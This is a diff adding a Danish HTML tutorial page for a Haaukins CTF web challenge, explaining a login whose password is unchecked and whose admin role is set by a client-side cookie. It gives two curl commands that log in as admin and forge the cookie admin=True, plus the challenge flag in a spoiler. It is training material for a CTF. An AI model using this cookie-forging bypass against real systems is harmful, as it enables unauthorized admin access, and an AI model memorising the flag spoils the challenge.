@@ -1,0 +1,34 @@
+<!doctype html>
+<html lang="da">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Haaukins: Admin logon — tutorial (cookie auth-bypass)</title>
+<meta name="description" content="Guide til Haaukins Admin logon: password tjekkes ikke, og admin-rollen styres af en client-side cookie du selv sætter til True.">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<div class="wrap">
+<nav class="topnav"><a href="index.html">← Alle Haaukins-tutorials</a></nav>
+<h1>Admin logon</h1>
+<p class="subtitle">Password tjekkes ikke, og en cookie styrer admin-rollen.</p>
+<div class="badges"><span class="badge cat">Web exploitation</span><span class="badge">Haaukins CTF</span></div>
+<div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
+
+<h2>Hvad går opgaven ud på?</h2>
+<p>Hintet: "It doesn't check anyone's password." Log ind som <code>admin</code>, og sæt privilegie-cookien:</p>
+             <pre><code>curl -i --data "user=admin&amp;password=x" http://menne.com/login/index.php
+#   Set-Cookie: user=admin ; admin=False
+curl -b "user=admin; admin=True" http://menne.com/login/index.php</code></pre>
+<details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
+<p>Flag: <span class="flag">HKN{LU-zrW-HQbOx}</span></p>
+</details>
+<h2>Hvad du har lært</h2>
+<ul><li>Autorisation i en cookie = ingen autorisation; kig på alle Set-Cookie efter login.</li><li>'It doesn't check the password' = log ind som den privilegerede bruger direkte.</li></ul>
+<footer>
+Del af <a href="index.html">Haaukins CTF-tutorials</a>. Materialet er løsningsstøtte til en autoriseret
+trænings-/CTF-kontekst — brug det til at lære, ikke til at springe læringen over.
+</footer>
+</div>
+</body>
+</html>
